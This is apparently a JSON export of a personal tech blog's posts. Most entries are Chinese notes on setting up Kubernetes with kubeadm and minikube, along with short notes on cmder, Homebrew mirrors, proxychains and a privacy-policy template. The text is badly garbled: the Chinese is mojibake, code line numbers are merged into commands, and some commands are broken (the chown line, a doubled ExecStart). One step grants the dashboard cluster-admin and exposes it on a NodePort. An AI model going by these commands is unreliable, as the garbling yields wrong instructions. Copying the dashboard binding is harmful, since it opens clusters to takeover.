k8s","slug":"history/tech/5ca31c749a5c06d95c088a97","date":"2019-04-01T20:25:24.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5ca31c749a5c06d95c088a97/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ca31c749a5c06d95c088a97/","excerpt":"","text":"å‰ç½®æ¡ä»¶ å®‰è£… dockerhttps://download.docker.com/linux/static/stable/ ä¿®æ”¹ç³»ç»Ÿå‚æ•°1234567891011$ cat &lt;&lt;EOF | tee /etc/sysctl.d/k8s.confnet.ipv4.ip_forward = 1net.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOF$ sysctl -p /etc/sysctl.d/k8s.conf``` ### ç¦ç”¨swap&gt;k8s 1.8 å¼€å§‹ï¼Œ éœ€è¦ç¦ç”¨ swap æˆ–ä¿®æ”¹ kubelet å¯åŠ¨å‚æ•° kubelet --fail-swap-on=false)swapoff -a &amp;&amp; sysctl -w vm.swappiness=0 cat /proc/swaps free blkid lsblk 12345### ä¿®æ”¹ fstab### é›†ç¾¤å†…æœºå™¨ product_uuid ä¸ IP ä¸èƒ½ç›¸åŒcat /sys/class/dmi/id/product_uuid12 ### mac åœ°å€æ£€æŸ¥(æ‰€æœ‰èŠ‚ç‚¹çš„ Mac åœ°å€ä¹Ÿä¸èƒ½ç›¸åŒ)ip a ifconfig -a 12### ç«¯å£å ç”¨æ£€æŸ¥ yum install -y net-tools netstat -ntlp | grep -E '6443|23[79,80]|1025[0,1,2]' 1234567891011121314 ### å®‰è£… cri-tools&gt;crictl åŒ…å«åœ¨ cri-tools é¡¹ç›®ä¸­ï¼Œè¿™ä¸ªé¡¹ç›®ä¸­åŒ…å«ä¸¤ä¸ªå·¥å…·ï¼šcrictl æ˜¯ kubelet CRI (Container Runtime Interface) çš„ CLI ã€‚critest æ˜¯ kubelet CRI çš„æµ‹è¯•å·¥å…·é›†ã€‚ä¸‹è½½åœ°å€:&lt;https://github.com/kubernetes-sigs/cri-tools/releases&gt;### å®‰è£… socat&gt;socat å¯ä»¥å»ºç«‹ä¸¤ä¸ªåŒå‘å­—èŠ‚æµå¹¶åœ¨å…¶ä¸­ä¼ è¾“æ•°æ®ï¼Œä»–çš„ä¸€ä¸ªåŠŸèƒ½æ˜¯å®ç°ç«¯å£è½¬å‘yum install -y socatapt-get install -y socat12345## å®‰è£… kubelet### kubelet service æ–‡ä»¶cat &lt;/etc/systemd/system/kubelet.service[Unit]Description=kubelet: The Kubernetes AgentDocumentation=http://kubernetes.io/docs/[Service]ExecStart=/usr/bin/kubeletRestart=alwaysStartLimitInterval=0RestartSec=10[Install]WantedBy=multi-user.targetEOF12### kubelet Drop-in æ–‡ä»¶(kubeadm.conf ä¼šè¢« systemd è‡ªåŠ¨è§£æï¼Œç”¨äºè¦†å†™ kubelet çš„åŸºç¡€ systemd é…ç½®)mkdir -p /etc/systemd/system/kubelet.service.dcat &lt;/etc/systemd/system/kubelet.service.d/kubeadm.conf[Service]Environment=â€œKUBELET_KUBECONFIG_ARGS=â€“bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.confâ€Environment=â€œKUBELET_CONFIG_ARGS=â€“config=/var/lib/kubelet/config.yamlâ€EnvironmentFile=-/var/lib/kubelet/kubeadm-flags.envEnvironmentFile=-/etc/default/kubeletExecStart=ExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGSEOF12### å¯åŠ¨ `kubelet`ï¼šsystemctl enable kubeletsystemctl start kubeletsystemctl status kubelet12### å¯åŠ¨kubeadm:kubeadm init --pod-network-cidr=10.244.0.0/16 --image-repository=registry.aliyuncs.com/google_containers --kubernetes-version=v1.15.012### æ ¹æ®æç¤ºä¿®æ”¹é…ç½®ï¼šmkdir -p $HOME/.kubecp /etc/kubernetes/admin.conf $HOME/.kube/configchown (idâˆ’u):(id -u):(idâˆ’u):(id -g) $HOME/.kube/config1234### ç»™æ¯å°ä¸»æœºå®‰è£… `cni` æ’ä»¶&lt;https://github.com/containernetworking/plugins/releases&gt;wget https://github.com/containernetworking/plugins/releases/download/v0.8.1/cni-plugins-linux-amd64-v0.8.1.tgztar -xzvf cni-plugins-linux-amd64-v0.8.1.tgz -C /opt/cni/bin/1234### å®‰è£… flannel ç½‘ç»œ&lt;https://github.com/coreos/flannel&gt;kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml12### æŸ¥çœ‹é›†ç¾¤çŠ¶æ€kubectl get nodes -o yaml | grep message 12345### å®‰è£… dashboard&lt;https://github.com/kubernetes/dashboard&gt;ä¿®æ”¹ ` image: k8s.gcr.io/kubernetes-dashboard-amd64:v1.10.1` ä¸º image: `registry.aliyuncs.com/google_containers/kubernetes-dashboard-amd64:v1.10.1`kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml1234### èµ‹äºˆ dashboard admin æƒé™&lt;https://github.com/kubernetes/dashboard/wiki/Access-control#admin-privileges&gt;kubectl create -f dashboard-admin.yaml12apiVersion: rbac.authorization.k8s.io/v1beta1kind: ClusterRoleBindingmetadata:name: kubernetes-dashboardlabels:k8s-app: kubernetes-dashboardroleRef:apiGroup: rbac.authorization.k8s.iokind: ClusterRolename: cluster-adminsubjects:kind: ServiceAccountname: kubernetes-dashboardnamespace: kube-system12345678### è®¿é—® 1.7.X ä»¥ä¸Šçš„ dashboard&lt;https://github.com/kubernetes/dashboard/wiki/Accessing-Dashboard---1.7.X-and-above&gt;ä¿®æ”¹ ClusterIP ä¸º NodePort:kubectl -n kube-system edit service kubernetes-dashboard12æŸ¥çœ‹ç«¯å£ï¼škubectl -n kube-system get service kubernetes-dashboard12è®¿é—®åœ°å€ä¸º:https://:12å¦‚æœå°è¯•åœ¨å¤šèŠ‚ç‚¹ç¾¤é›†ä¸Šä½¿ç”¨NodePortå…¬å¼€Dashboardï¼Œåˆ™å¿…é¡»æ‰¾åˆ°è¿è¡ŒDashboardçš„èŠ‚ç‚¹çš„IP:https://:123ä½¿ç”¨ ä»¤ç‰Œç™»é™†kubectl -n kube-system get serviceaccount -l k8s-app=kubernetes-dashboard -o yamlkubectl -n kube-system describe secrets kubernetes-dashboard-token-xxa481234567## å…¶å®ƒæ“ä½œ- æŸ¥çœ‹é»˜è®¤é…ç½®:kubeadm config print init-defaults12- æŸ¥çœ‹å½“å‰kubeadmç‰ˆæœ¬å·å’Œæ‰€éœ€ç»„ä»¶kubeadm config images list --kubernetes-version=v1.15.0k8s.gcr.io/kube-apiserver:v1.15.0k8s.gcr.io/kube-controller-manager:v1.15.0k8s.gcr.io/kube-scheduler:v1.15.0k8s.gcr.io/kube-proxy:v1.15.0k8s.gcr.io/pause:3.1k8s.gcr.io/etcd:3.3.10k8s.gcr.io/coredns:1.3.1 å‚è€ƒèµ„æ–™: &lt;https://godoc.org/k8s.io/kubernetes/cmd/kubeadm/app/apis/kubeadm/v1beta1&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ç”»å›¾å·¥å…· asciiflow","slug":"history/tech/5ca30dab9a5c06d95c088a96","date":"2019-04-01T19:22:19.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5ca30dab9a5c06d95c088a96/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ca30dab9a5c06d95c088a96/","excerpt":"","text":"å¾…è¡¥å……","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"cmder","slug":"history/tech/5ca1845531b7242e3104d687","date":"2019-04-01T03:24:05.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5ca1845531b7242e3104d687/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ca1845531b7242e3104d687/","excerpt":"","text":"ä¸‹è½½åœ°å€:https://cmder.net/å³é”®ï¼š1Cmder.exe /REGISTER ALLç•Œé¢è®¾ç½®ï¼š1windows+alt+pè¿›å…¥ç•Œé¢è®¾ç½®å¿«æ·é”®ï¼š12345678910111213141516171819202122232425Tab è‡ªåŠ¨è·¯å¾„è¡¥å…¨Ctrl+T å»ºç«‹æ–°é¡µç­¾Ctrl+W å…³é—­é¡µç­¾Ctrl+Tab åˆ‡æ¢é¡µç­¾Alt+F4 å…³é—­æ‰€æœ‰é¡µç­¾Alt+Shift+1 å¼€å¯cmd.exeAlt+Shift+2 å¼€å¯powershell.exeAlt+Shift+3 å¼€å¯powershell.exe (ç³»ç»Ÿç®¡ç†å‘˜æƒé™)Ctrl+1 å¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬1ä¸ªé¡µç­¾Ctrl+n å¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬nä¸ªé¡µç­¾( nå€¼æ— ä¸Šé™)Alt + enter åˆ‡æ¢åˆ°å…¨å±çŠ¶æ€Ctr+r å†å²å‘½ä»¤æœç´¢Tab è‡ªåŠ¨è·¯å¾„è¡¥å…¨Ctrl+T å»ºç«‹æ–°é¡µç­¾Ctrl+W å…³é—­é¡µç­¾Ctrl+Tab åˆ‡æ¢é¡µç­¾Alt+F4 å…³é—­æ‰€æœ‰é¡µç­¾Alt+Shift+1 å¼€å¯cmd.exeAlt+Shift+2 å¼€å¯powershell.exeAlt+Shift+3 å¼€å¯powershell.exe (ç³»ç»Ÿç®¡ç†å‘˜æƒé™)Ctrl+1 å¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬1ä¸ªé¡µç­¾Ctrl+n å¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬nä¸ªé¡µç­¾( nå€¼æ— ä¸Šé™)Alt + enter åˆ‡æ¢åˆ°å…¨å±çŠ¶æ€Ctr+r å†å²å‘½ä»¤æœç´¢Win+Alt+P å¼€å¯å·¥å…·é€‰é¡¹è§†çª—","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Homebrew Bottlesæº","slug":"history/tech/5ca0d18d31b7242e3104d686","date":"2019-03-31T02:41:17.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5ca0d18d31b7242e3104d686/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ca0d18d31b7242e3104d686/","excerpt":"","text":"1https://lug.ustc.edu.cn/wiki/mirrors/help/brew.git","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"brew","slug":"brew","permalink":"https://wangxiuwen.github.io/tags/brew/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… dig","slug":"history/tech/5ca0976e31b7242e3104d685","date":"2019-03-30T22:33:18.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5ca0976e31b7242e3104d685/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ca0976e31b7242e3104d685/","excerpt":"","text":"1yum install bind-utils","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"App Store éšç§æ”¿ç­–","slug":"history/share/5c9ceccf31b7242e3104d684","date":"2019-03-28T03:48:31.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/share/5c9ceccf31b7242e3104d684/","link":"","permalink":"https://wangxiuwen.github.io/history/share/5c9ceccf31b7242e3104d684/","excerpt":"","text":"æœ¬è½¯ä»¶å°Šé‡å¹¶ä¿æŠ¤æ‰€æœ‰ä½¿ç”¨æœåŠ¡ç”¨æˆ·çš„ä¸ªäººéšç§æƒã€‚ä¸ºäº†ç»™æ‚¨æä¾›æ›´å‡†ç¡®ã€æ›´æœ‰ä¸ªæ€§åŒ–çš„æœåŠ¡ï¼Œæœ¬è½¯ä»¶ä¼šæŒ‰ç…§æœ¬éšç§æƒæ”¿ç­–çš„è§„å®šä½¿ç”¨å’ŒæŠ«éœ²æ‚¨çš„ä¸ªäººä¿¡æ¯ã€‚ä½†æœ¬è½¯ä»¶å°†ä»¥é«˜åº¦çš„å‹¤å‹‰ã€å®¡æ…ä¹‰åŠ¡å¯¹å¾…è¿™äº›ä¿¡æ¯ã€‚é™¤æœ¬éšç§æƒæ”¿ç­–å¦æœ‰è§„å®šå¤–ï¼Œåœ¨æœªå¾å¾—æ‚¨äº‹å…ˆè®¸å¯çš„æƒ…å†µä¸‹ï¼Œæœ¬è½¯ä»¶ä¸ä¼šå°†è¿™äº›ä¿¡æ¯å¯¹å¤–æŠ«éœ²æˆ–å‘ç¬¬ä¸‰æ–¹æä¾›ã€‚æœ¬è½¯ä»¶ä¼šä¸æ—¶æ›´æ–°æœ¬éšç§æƒæ”¿ç­–ã€‚æ‚¨åœ¨åŒæ„æœ¬è½¯ä»¶æœåŠ¡ä½¿ç”¨åè®®ä¹‹æ—¶ï¼Œå³è§†ä¸ºæ‚¨å·²ç»åŒæ„æœ¬éšç§æƒæ”¿ç­–å…¨éƒ¨å†…å®¹ã€‚æœ¬éšç§æƒæ”¿ç­–å±äºæœ¬è½¯ä»¶æœåŠ¡ä½¿ç”¨åè®®ä¸å¯åˆ†å‰²çš„ä¸€éƒ¨åˆ†ã€‚1.é€‚ç”¨èŒƒå›´a)åœ¨æ‚¨ä½¿ç”¨æœ¬è½¯ä»¶ç½‘ç»œæœåŠ¡ï¼Œæœ¬è½¯ä»¶è‡ªåŠ¨æ¥æ”¶å¹¶è®°å½•çš„æ‚¨çš„æ‰‹æœºä¸Šçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºæ‚¨çš„ç…§ç›¸æœºã€æ¨é€ã€è®¿é—®æ—¥æœŸå’Œæ—¶é—´ã€è½¯ç¡¬ä»¶ç‰¹å¾ä¿¡æ¯åŠæ‚¨éœ€æ±‚çš„ç½‘é¡µè®°å½•ç­‰æ•°æ®ï¼›2.ä¿¡æ¯çš„ä½¿ç”¨a)åœ¨è·å¾—æ‚¨çš„æ•°æ®ä¹‹åï¼Œæœ¬è½¯ä»¶ä¼šå°†å…¶ä¸Šä¼ è‡³æœåŠ¡å™¨ï¼Œä»¥è®°å½•ä½ çš„äº¤æ˜“ä¿¡æ¯ï¼Œä»¥ä¾¿æ‚¨èƒ½å¤Ÿæ›´å¥½åœ°ä½¿ç”¨æœåŠ¡ã€‚3.ä¿¡æ¯æŠ«éœ²a)æœ¬è½¯ä»¶ä¸ä¼šå°†æ‚¨çš„ä¿¡æ¯æŠ«éœ²ç»™ä¸å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ã€‚b)æ ¹æ®æ³•å¾‹çš„æœ‰å…³è§„å®šï¼Œæˆ–è€…è¡Œæ”¿æˆ–å¸æ³•æœºæ„çš„è¦æ±‚ï¼Œå‘ç¬¬ä¸‰æ–¹æˆ–è€…è¡Œæ”¿ã€å¸æ³•æœºæ„æŠ«éœ²ï¼›c)å¦‚æ‚¨å‡ºç°è¿åä¸­å›½æœ‰å…³æ³•å¾‹ã€æ³•è§„æˆ–è€…ç›¸å…³è§„åˆ™çš„æƒ…å†µï¼Œéœ€è¦å‘ç¬¬ä¸‰æ–¹æŠ«éœ²ï¼›4.ä¿¡æ¯å­˜å‚¨å’Œäº¤æ¢æœ¬è½¯ä»¶æ”¶é›†çš„æœ‰å…³æ‚¨çš„ä¿¡æ¯å’Œèµ„æ–™å°†ä¿å­˜åœ¨æœ¬è½¯ä»¶åŠï¼ˆæˆ–ï¼‰å…¶å…³è”å…¬å¸çš„æœåŠ¡å™¨ä¸Šï¼Œè¿™äº›ä¿¡æ¯å’Œèµ„æ–™å¯èƒ½ä¼ é€è‡³æ‚¨æ‰€åœ¨å›½å®¶ã€åœ°åŒºæˆ–æœ¬è½¯ä»¶æ”¶é›†ä¿¡æ¯å’Œèµ„æ–™æ‰€åœ¨åœ°çš„å¢ƒå¤–å¹¶åœ¨å¢ƒå¤–è¢«è®¿é—®ã€å­˜å‚¨å’Œå±•ç¤ºã€‚5.ä¿¡æ¯å®‰å…¨a)åœ¨ä½¿ç”¨æœ¬è½¯ä»¶ç½‘ç»œæœåŠ¡è¿›è¡Œç½‘ä¸Šäº¤æ˜“æ—¶ï¼Œæ‚¨ä¸å¯é¿å…çš„è¦å‘äº¤æ˜“å¯¹æ–¹æŠ«éœ²è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼Œå¦‚è”ç»œæ–¹å¼æˆ–è€…è¯ä»¶ä¿¡æ¯ã€‚è¯·æ‚¨å¦¥å–„ä¿æŠ¤è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼Œä»…åœ¨å¿…è¦çš„æƒ…å½¢ä¸‹å‘ä»–äººæä¾›ã€‚å¦‚æ‚¨å‘ç°è‡ªå·±çš„ä¸ªäººä¿¡æ¯æ³„å¯†ï¼Œè¯·æ‚¨ç«‹å³è”ç»œæœ¬è½¯ä»¶å®¢æœï¼Œä»¥ä¾¿æœ¬è½¯ä»¶é‡‡å–ç›¸åº”æªæ–½ã€‚","categories":[{"name":"åˆ†äº«","slug":"åˆ†äº«","permalink":"https://wangxiuwen.github.io/categories/%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"share","slug":"share","permalink":"https://wangxiuwen.github.io/tags/share/"},{"name":"åˆ†äº«","slug":"åˆ†äº«","permalink":"https://wangxiuwen.github.io/tags/%E5%88%86%E4%BA%AB/"}],"author":"baipeng"},{"title":"centos å®‰è£… proxychain","slug":"history/tech/5c9ae21031b7242e3104d683","date":"2019-03-27T02:38:08.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c9ae21031b7242e3104d683/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c9ae21031b7242e3104d683/","excerpt":"","text":"123456git clone https://github.com/rofl0r/proxychains-ngcd proxychains-ng./configure --prefix=/usr --sysconfdir=/etcmake make installmake install-config","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"x509 è¯ä¹¦ä»‹ç»","slug":"history/tech/5c998cffeac98afd53889108","date":"2019-03-26T02:22:55.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c998cffeac98afd53889108/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c998cffeac98afd53889108/","excerpt":"","text":"x509 è¯ä¹¦ä»‹ç» ----- å¾…è®°å½•k8s api server è®¤è¯ä½¿ç”¨ x509 è¯ä¹¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux æ¸…ç†dns ç¼“å­˜","slug":"history/tech/5c9a097c31b7242e3104d682","date":"2019-03-25T23:14:04.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c9a097c31b7242e3104d682/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c9a097c31b7242e3104d682/","excerpt":"","text":"1/etc/init.d/nscd restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è™šæ‹Ÿæœºåˆ†ç±»","slug":"history/tech/5c9a01e9eac98afd5388910c","date":"2019-03-25T22:41:45.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c9a01e9eac98afd5388910c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c9a01e9eac98afd5388910c/","excerpt":"","text":"macOS:123virtualboxvmwarehyperkitLinux:12VirtualBoxKVMwindows:12VirtualBoxHyper-Vé“¾æ¥ï¼švirtualboxvmwarehyperkitkvmHyper-V","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"minikube å®‰è£… k8s","slug":"history/tech/5c9a01bbeac98afd5388910b","date":"2019-03-25T22:40:59.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c9a01bbeac98afd5388910b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c9a01bbeac98afd5388910b/","excerpt":"","text":"kubectl å®‰è£…ç”±äº API ç‰ˆæœ¬å…¼å®¹çš„é—®é¢˜ï¼Œå°½é‡ä¿æŒ kubectl ç‰ˆæœ¬ä¸ K8S é›†ç¾¤ç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼Œæˆ–ç‰ˆæœ¬ç›¸å·®åœ¨åœ¨ä¸€ä¸ªå°ç‰ˆæœ¬å†…https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl1curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.14.0/bin/linux/amd64/kubectlæˆ–è€…åœ¨ k8s github åœ°å€ changelog ä¸­ä¸‹è½½1https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.14.md minikube å®‰è£…å®˜æ–¹ä¸‹è½½åœ°å€ï¼šhttps://github.com/kubernetes/minikube/releaseså›½å†…æ­£å¸¸æ— æ³•å¯åŠ¨æˆåŠŸï¼Œå› ä¸ºå®ƒè¦ä» gcr.io æ‹‰å–é•œåƒ, minikube 1.0.0 å¢åŠ äº† --image-repository å‚æ•°, å°†æ­¤å‚æ•°æŒ‡å®šåˆ°é˜¿é‡Œäº‘å³å¯ã€‚å®‰è£…æ–¹æ³•ï¼š1minikube delete // åˆ é™¤ç°æœ‰è™šæœºï¼Œåˆ é™¤ ~/.minikube ç›®å½•ç¼“å­˜çš„æ–‡ä»¶å¯åŠ¨ï¼š1minikube start --vm-driver=none --registry-mirror=https://registry.docker-cn.com --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers --kubernetes-version v1.14.0åœ¨ Linux ç³»ç»Ÿä¸Šé¢ï¼Œå°† Minikube çš„ --vm-driver å‚æ•°è®¾ç½®ä¸º none ï¼Œå¹¶ä¸”åœ¨æœ¬æœºå·²ç»æ­£ç¡®å®‰è£… Dockerï¼Œåˆ™æ— éœ€è™šæ‹ŸåŒ–æ”¯æŒã€‚å¯åŠ¨è¿‡ç¨‹:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748root@testminikube:~# minikube start --vm-driver=none --image-repository registry.cn-hangzhou.aliyuncs.com/google_containerso minikube v1.0.0 on linux (amd64)$ Downloading Kubernetes v1.14.0 images in the background ...&gt; Creating none VM (CPUs=2, Memory=2048MB, Disk=20000MB) ...2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous2019/04/01 04:09:16 No matching credentials were found, falling back on anonymous- &quot;minikube&quot; IP address is 192.168.3.18- Configuring Docker as the container runtime ...- Version of container runtime is 18.06.1-ce: Waiting for image downloads to complete ...- Preparing Kubernetes environment ...- Pulling images required by Kubernetes v1.14.0 ...- Launching Kubernetes v1.14.0 using kubeadm ...: Waiting for pods: apiserver proxy etcd scheduler controller dns- Configuring cluster permissions ...- Verifying component health .....&gt; Configuring local host environment ...! The &apos;none&apos; driver provides limited isolation and may reduce system security and reliability.! For more information, see:- https://github.com/kubernetes/minikube/blob/master/docs/vmdriver-none.md! kubectl and minikube configuration will be stored in /root! To use kubectl or minikube commands as your own user, you may! need to relocate them. For example, to overwrite your own settings: - sudo mv /root/.kube /root/.minikube $HOME - sudo chown -R $USER $HOME/.kube $HOME/.minikubei This can also be done automatically by setting the env var CHANGE_MINIKUBE_NONE_USER=true+ kubectl is now configured to use &quot;minikube&quot;= Done! Thank you for using minikube!root@testminikube:~# kubectl cluster-infoKubernetes master is running at https://192.168.3.18:8443KubeDNS is running at https://192.168.3.18:8443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxyTo further debug and diagnose cluster problems, use &apos;kubectl cluster-info dump&apos;. DNS é—®é¢˜ï¼šå¯åŠ¨coreDNS å‡ºé”™debugåœ°å€ https://coredns.io/plugins/loop/12345678910111213141516171819202122232425262728root@testminikube:~# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESdc90838be2c1 eb516548c180 &quot;/coredns -conf /etcâ€¦&quot; 2 minutes ago Exited (1) 2 minutes ago k8s_coredns_coredns-d5947d4b-js28m_kube-system_f5c81728-544c-11e9-a910-000c295104be_12a2d90e4b0c6b eb516548c180 &quot;/coredns -conf /etcâ€¦&quot; 2 minutes ago Exited (1) 2 minutes ago k8s_coredns_coredns-d5947d4b-4vz2j_kube-system_f5c50971-544c-11e9-a910-000c295104be_126e4be3a7474b 4689081edb10 &quot;/storage-provisioner&quot; 39 minutes ago Up 39 minutes k8s_storage-provisioner_storage-provisioner_kube-system_fe64bff1-544c-11e9-a910-000c295104be_059b80b5b458a registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 39 minutes ago Up 39 minutes k8s_POD_storage-provisioner_kube-system_fe64bff1-544c-11e9-a910-000c295104be_0df5821598c5d 5cd54e388aba &quot;/usr/local/bin/kubeâ€¦&quot; 39 minutes ago Up 39 minutes k8s_kube-proxy_kube-proxy-l9rpj_kube-system_f5c47051-544c-11e9-a910-000c295104be_060d7a877574d registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 39 minutes ago Up 39 minutes k8s_POD_coredns-d5947d4b-js28m_kube-system_f5c81728-544c-11e9-a910-000c295104be_0cadbc4575d5c registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 39 minutes ago Up 39 minutes k8s_POD_coredns-d5947d4b-4vz2j_kube-system_f5c50971-544c-11e9-a910-000c295104be_0186e88e78b9c registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 39 minutes ago Up 39 minutes k8s_POD_kube-proxy-l9rpj_kube-system_f5c47051-544c-11e9-a910-000c295104be_059104dbfe8cb ecf910f40d6e &quot;kube-apiserver --adâ€¦&quot; 40 minutes ago Up 40 minutes k8s_kube-apiserver_kube-apiserver-minikube_kube-system_34d581cbe7724b7c44f1bcc01808ce2b_0d4fe90aeab1c 2c4adeb21b4f &quot;etcd --advertise-clâ€¦&quot; 40 minutes ago Up 40 minutes k8s_etcd_etcd-minikube_kube-system_0b2be8e1a0609d0edec7456c26d2017e_05fd380724605 119701e77cbc &quot;/opt/kube-addons.sh&quot; 40 minutes ago Up 40 